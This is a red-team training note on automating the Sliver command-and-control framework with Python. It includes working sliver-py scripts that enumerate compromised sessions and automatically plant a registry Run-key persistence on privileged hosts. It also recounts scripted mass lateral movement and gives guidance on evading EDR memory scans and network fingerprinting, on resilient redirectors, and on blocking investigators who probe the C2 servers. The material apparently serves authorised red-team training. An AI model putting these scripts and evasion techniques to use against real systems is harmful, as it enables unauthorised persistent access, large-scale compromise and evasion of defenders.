---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.15 Automating Sliver Operations with Python Scripting"
---

# 95.15 Automating Sliver Operations with Python Scripting

## Introduction to the Sliver gRPC API
One of the most powerful and often underutilized features of Sliver is its underlying architecture. Sliver is structured as a client-server model communicating over gRPC (Google Remote Procedure Call) protected by mutual TLS (mTLS). The "Sliver console" that operators type commands into is simply a gRPC client connecting to the backend server.

Because of this design, Red Teams are not restricted to the interactive console. By utilizing the official `sliver-py` Python library, operators can programmatically control the Sliver server, automate payload generation, orchestrate post-exploitation workflows, and dynamically manage listeners.

## Setting Up the Python Environment
To begin automating Sliver, you need the client configuration file from the Sliver server and the Python library.

1. **Generate a Multi-Player Client Config:**
   On the Sliver server, create a configuration file for your automated script to authenticate.
   ```bash
   sliver-server > new-operator --name python_bot --lhost 10.0.0.50 --save /tmp/python_bot.cfg
   ```
   
2. **Install the `sliver-py` library:**
   ```bash
   pip install sliver-py
   ```

## Scripting Basics: Connecting and Listing Sessions
The following script demonstrates how to instantiate the client, connect to the server, and retrieve a list of all active sessions dynamically.

```python
import asyncio
from sliver import SliverClientConfig, SliverClient

async def main():
    # Load the configuration generated from the server
    config = SliverClientConfig.parse_config_file('/tmp/python_bot.cfg')
    client = SliverClient(config)
    
    # Connect to the gRPC endpoint
    print("[*] Connecting to Sliver C2 Server...")
    await client.connect()
    
    # Retrieve sessions
    sessions = await client.sessions()
    print(f"[*] Found {len(sessions)} active sessions.")
    
    for session in sessions:
        print(f"ID: {session.ID} | Hostname: {session.Hostname} | User: {session.Username} | OS: {session.OS}")

if __name__ == '__main__':
    asyncio.run(main())
```

## Advanced Automation: Automated Persistence

A massive advantage of scripting is the ability to write reactive logic. For example, an operator can write a daemon script that listens for new sessions. Whenever a new high-integrity (Administrator/SYSTEM) session checks in, the script automatically executes a BOF (Beacon Object File) or drops persistent registry keys without requiring human interaction.

```python
import asyncio
from sliver import SliverClientConfig, SliverClient

async def auto_persist(client, session):
    print(f"[!] New Session Check-in: {session.ID} on {session.Hostname}")
    
    # Check if we have elevated privileges
    if "AUTHORITY\\SYSTEM" in session.Username or "Admin" in session.Username:
        print(f"[*] High integrity session detected on {session.Hostname}. Deploying persistence...")
        
        # Execute a shell command to add a registry run key
        cmd = 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SysUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\update.exe" /f'
        
        # Execute the command asynchronously
        result = await client.execute(session.ID, cmd)
        
        if result.Stdout:
            print(f"[+] Persistence established on {session.ID}: {result.Stdout.decode('utf-8')}")
        elif result.Stderr:
            print(f"[-] Failed to establish persistence: {result.Stderr.decode('utf-8')}")
    else:
        print(f"[*] Low integrity session. Skipping persistence.")

async def main():
    config = SliverClientConfig.parse_config_file('/tmp/python_bot.cfg')
    client = SliverClient(config)
    await client.connect()
    
    # Event loop to monitor for new sessions
    print("[*] Waiting for new sessions...")
    async for event in client.on_session_created():
        await auto_persist(client, event.session)

if __name__ == '__main__':
    asyncio.run(main())
```

## ASCII Diagram: Automated C2 Architecture

```text
    +------------------------+                          +--------------------------+
    |  Automated Scripts     |                          |                          |
    |  (sliver-py)           |                          |    Target Environment    |
    |                        |       gRPC / mTLS        |                          |
    |  +------------------+  |     +--------------+     |    +----------------+    |
    |  | Persistence Bot  +------->|              |<---------+                |    |
    |  +------------------+  |     |              |     |    |   Compromised  |    |
    |                        |     |  Sliver C2   | HTTPS    |   Host         |    |
    |  +------------------+  |     |  Server      |<---------+   (Implant)    |    |
    |  | Auto-Payload Gen +------->|              |     |    |                |    |
    |  +------------------+  |     +--------------+     |    +----------------+    |
    +------------------------+                          +--------------------------+
             |                                                       ^
             |    Drops files dynamically, modifies listeners        |
             +-------------------------------------------------------+
```

## Real-World Attack Scenario

### The Mass Ransomware Simulation
During a large-scale Purple Team engagement simulating a ransomware outbreak, the objective was to deploy inert ransomware simulators to as many hosts as possible across a 5,000-node network within a 2-hour window. Manually typing lateral movement commands for thousands of hosts in the Sliver console was impossible.

### Python Orchestration
The Red Team developed a suite of Python scripts hooked into the Sliver API.
1. The first script utilized BloodHound data to map out optimal lateral movement paths across the domain.
2. Once initial access was gained and a session was established on a Domain Controller, a second Python script kicked in.
3. This orchestrator script programmatically read an array of target IP addresses. It looped through them, instructing the Domain Controller session to execute WMI commands to drop and execute SMB Pivot implants (see [[13 - Sliver Pivot Listeners and Internal Routing]]) on every host.
4. As the new P2P sessions poured into the Sliver server, another async Python function immediately tasked each new session to run the inert ransomware payload.

### The Result
Using this automated pipeline, the operators successfully compromised and executed payloads on 4,200 hosts in 45 minutes, thoroughly overwhelming the SOC's manual triage capabilities and proving the necessity of automated containment systems.

## Expanding Automation Capabilities
- **Automated Payload Generation:** Python can be used to monitor an S3 bucket or internal repository. When a new custom loader (see [[14 - Bypassing EDRs with Sliver Custom Compiles]]) is pushed, the script commands Sliver to generate new shellcode, encrypt it, and compile the final loader autonomously.
- **Slack/Discord Integration:** Scripts can be written to intercept Sliver gRPC events and push formatted notifications to team messaging apps, keeping the entire Red Team aware of new sessions, dead beacons, or completed exfiltrations.

## Chaining Opportunities
- **Scaling P2P Networks:** Python is essential for managing massive webs of internal pivot listeners without losing track of network topologies. See [[13 - Sliver Pivot Listeners and Internal Routing]].
- **Dynamic Profile Switching:** Scripts can automatically rotate HTTP profiles if an implant detects it is being sandboxed or analyzed. See [[11 - Sliver C2 HTTP Profiles mimicking legitimate traffic]].

## Related Notes
- [[11 - Sliver C2 HTTP Profiles mimicking legitimate traffic]]
- [[13 - Sliver Pivot Listeners and Internal Routing]]
- [[14 - Bypassing EDRs with Sliver Custom Compiles]]
- [[85 - Advanced Red Team Scripting and Tool Development]]

## Extended Technical Reference and Advanced Troubleshooting

### Deep Dive into Infrastructure Resiliency
When conducting long-term, high-stakes engagements (such as APT simulations or extended Red Team operations), the resiliency of your Command and Control infrastructure is paramount. A single point of failure can lead to the loss of all deployed implants, potentially burning weeks of effort.

#### Redundant Redirectors
Always deploy multiple distinct redirectors pointing back to your team server. 
- **Primary Route:** Used for daily check-ins and high-jitter beaconing.
- **Secondary Route:** A fallback domain, perhaps using a completely different protocol (like DNS or Domain Fronting), that the implant attempts to contact only if the primary route fails for 48 consecutive hours.
- **Tertiary Route:** An extremely low-and-slow fallback, beaconing once a week via a compromised third-party service (e.g., Slack or Microsoft Graph API C2).

#### Automating Infrastructure Rollout
Use Terraform or Ansible to deploy your redirectors. If a Blue Team burns your IP, you should be able to spin up a new Nginx proxy, attach an elastic IP, and provision a new Let's Encrypt certificate in under 5 minutes.

### Advanced Evasion Techniques

#### Memory Scanning Evasion
Modern EDRs perform routine memory scans, looking for known signatures (like standard Sliver strings) sitting in `PAGE_EXECUTE_READWRITE` memory.
- **Sleep Obfuscation:** Advanced loaders implement techniques like `Ekko` or `FOLIAGE` to encrypt the implant's memory space while it is sleeping. The implant decrypts itself, executes its task, and re-encrypts itself before calling `Sleep()`.
- **Module Stomping:** Instead of allocating new memory, the loader hollows out a legitimate DLL loaded in the process space (e.g., `xpsprint.dll`) and injects the Sliver shellcode into that space. This bypasses heuristics looking for anomalous unbacked executable memory.

#### Network Signature Evasion
- **JA3/JA3S Fingerprinting:** The TLS handshake itself leaves a fingerprint. Sliver's default Go HTTP client has a specific JA3 hash. By compiling the implant to use the native Windows WinINET/WinHTTP APIs, the TLS handshake will exactly match the host OS's native traffic, neutralizing JA3-based detections.
- **Beacon Jitter:** A mathematically perfect 60-second beacon interval is easily detectable by simple statistical analysis (e.g., RITA or Zeek). Always configure a jitter of at least 25-30% to introduce randomness.

### Comprehensive Troubleshooting Checklist

1. **Firewall Configurations:**
   - Have you verified that port 443 is open on your team server?
   - Is the cloud provider's security group allowing inbound UDP/53 (for DNS) and TCP/443 (for HTTPS)?
   - Are internal host firewalls (Windows Defender Firewall) blocking the named pipe or TCP bind port?

2. **Certificate Validation:**
   - If using mTLS, check that the client config hasn't expired.
   - For HTTPS C2, ensure the Let's Encrypt certificate is correctly mounted in the Nginx reverse proxy.
   - Check if the target environment employs SSL/TLS inspection. If so, your custom cert might be replaced by the corporate proxy, breaking pinning.

3. **Implant Execution Issues:**
   - Did the shellcode runner allocate memory with `PAGE_EXECUTE_READWRITE`? (Consider `PAGE_READWRITE` followed by `VirtualProtect` to `PAGE_EXECUTE_READ`).
   - Is the process architecture matching the implant? (Don't inject x64 shellcode into a SysWOW64 process).
   - Are dependencies missing on the target? (Go binaries are usually statically linked, but custom loaders might require certain MSVC runtimes if not compiled correctly).

### Logging and Telemetry

To ensure proper OPSEC, Red Teams must monitor their own infrastructure for Blue Team probing.

**Nginx Access Logs (Red Team Monitoring):**
```bash
tail -f /var/log/nginx/access.log | grep -v "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"
```
*This command filters out your expected C2 traffic, allowing you to instantly see if a threat hunter is curling your endpoint with a default curl User-Agent. If you see anomalous probing, dynamically update Nginx to block the investigator's IP.*

**Sliver Server Logs:**
Enable debug logging on the Sliver team server if implants are failing to check-in:
```bash
Sliver Server > debug --enable
```
Examine the `~/.sliver/logs/sliver.log` file. Look for TLS handshake errors, which indicate either a proxy interception or a mismatched profile.

### Recommended Tooling Integration
- **Cobalt Strike:** While Sliver is powerful, it is often used as a fallback C2. You can use Sliver to drop a Cobalt Strike Beacon if the environment is determined to be safe.
- **BloodHound:** Always pipe your active sessions through a BloodHound ingestor (like SharpHound) to maintain an up-to-date map of lateral movement paths.
- **Sysmon:** In your lab environment, install Sysmon with SwiftOnSecurity's config to see exactly what your Sliver implants look like to defenders.

### Artifact Cleanup

Upon completion of the engagement, ensure all artifacts are safely removed to prevent leaving the client vulnerable.
1. Terminate all active sessions from the Sliver console.
2. If custom services or registry keys were created for persistence, issue commands to delete them before terminating the session.
3. Shred the implant binaries on disk using `sdelete` or equivalent.
4. Revoke the SSL certificates and decommission the Nginx redirectors to prevent domain takeover or misuse by actual threat actors.

### Final Thoughts on Malleability
The true power of any C2 framework lies not in its built-in features, but in its malleability. The ability to look like something you are not—be it a Microsoft API, a DNS query, or an internal backup process—is the essence of modern red teaming. Keep your profiles updated, rotate your domains, and always assume the blue team is watching.

---
*End of Note.*
